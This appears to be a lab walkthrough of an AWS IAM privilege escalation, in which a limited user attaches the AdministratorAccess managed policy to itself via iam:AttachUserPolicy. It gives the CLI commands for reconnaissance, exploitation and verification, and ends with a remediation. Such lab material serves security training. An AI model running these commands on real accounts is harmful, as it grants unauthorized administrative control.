# Guided Walkthrough: Self-Escalation Privilege Escalation via iam:AttachUserPolicy

This scenario demonstrates a privilege escalation vulnerability where a user has permission to attach managed policies to themselves. The attacker can use `iam:AttachUserPolicy` to attach the AWS-managed `AdministratorAccess` policy to their own user, immediately escalating their privileges to administrator level.

Unlike inline policies, this technique leverages existing managed policies, making it simpler to execute and potentially easier to overlook during security reviews. The attack requires only a single API call to gain full administrative access.

This is a self-escalation pattern: the compromised principal directly modifies its own permissions rather than pivoting to a separate privileged principal. It is one of the simplest and most impactful privilege escalation techniques available in AWS IAM.

## The Challenge

You start as the IAM user `pl-prod-iam-008-to-admin-starting-user`. Your credentials have been issued with an attached inline policy that grants `iam:AttachUserPolicy` on all resources (`*`). Your goal is to escalate to full administrator access within the AWS account.

The `AdministratorAccess` managed policy (`arn:aws:iam::aws:policy/AdministratorAccess`) is an AWS-managed policy that grants unrestricted access to all AWS services and resources. If you can attach it to your own user, you immediately become an administrator.

## Reconnaissance

First, confirm your identity and verify your starting permissions are as limited as expected:

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::{account_id}:user/pl-prod-iam-008-to-admin-starting-user
```

Try something that requires admin access to confirm you don't have it yet:

```bash
aws iam list-users --max-items 1
# AccessDenied: User: arn:aws:iam::... is not authorized to perform: iam:ListUsers
```

Good — limited permissions confirmed. Now let's look at what policies are currently attached to your user:

```bash
aws iam list-attached-user-policies --user-name pl-prod-iam-008-to-admin-starting-user
```

You'll see no managed policies are attached yet. The only permissions come from the inline policy granting `iam:AttachUserPolicy`.

## Exploitation

The exploit is a single API call. You attach the `AdministratorAccess` AWS managed policy to yourself:

```bash
aws iam attach-user-policy \
  --user-name pl-prod-iam-008-to-admin-starting-user \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

IAM policy changes propagate within seconds but can take up to 60 seconds in practice. Wait 15 seconds before testing:

```bash
sleep 15
```

That's it. One call. No role assumption, no credential rotation, no waiting for a Lambda to execute. The managed policy is now attached to your user and takes effect immediately.

## Verification

Confirm the `AdministratorAccess` policy is now attached:

```bash
aws iam list-attached-user-policies \
  --user-name pl-prod-iam-008-to-admin-starting-user \
  --query 'AttachedPolicies[*].PolicyArn' \
  --output text
# arn:aws:iam::aws:policy/AdministratorAccess
```

Now test that admin-level operations succeed:

```bash
# List all IAM users in the account
aws iam list-users --max-items 5 --query 'Users[*].UserName' --output text

# List all S3 buckets
aws s3 ls
```

Both commands should return results. You now have unrestricted access to all AWS services in this account.

## What Happened

The attack chain is minimal:

```
pl-prod-iam-008-to-admin-starting-user
  → iam:AttachUserPolicy (on self)
  → AdministratorAccess policy attached
  → Effective administrator
```

In a real-world compromise, this technique is particularly dangerous because it requires no lateral movement — a single compromised credential is enough to own the account. The `iam:AttachUserPolicy` permission is often granted without understanding that it enables self-escalation. Security teams reviewing IAM policies may focus on direct admin grants and miss that `AttachUserPolicy` on `*` is functionally equivalent to granting admin access.

The fix is straightforward: never grant `iam:AttachUserPolicy` without a restrictive `iam:PolicyARN` condition key that limits which policies can be attached, and never allow users to modify their own permission boundaries.
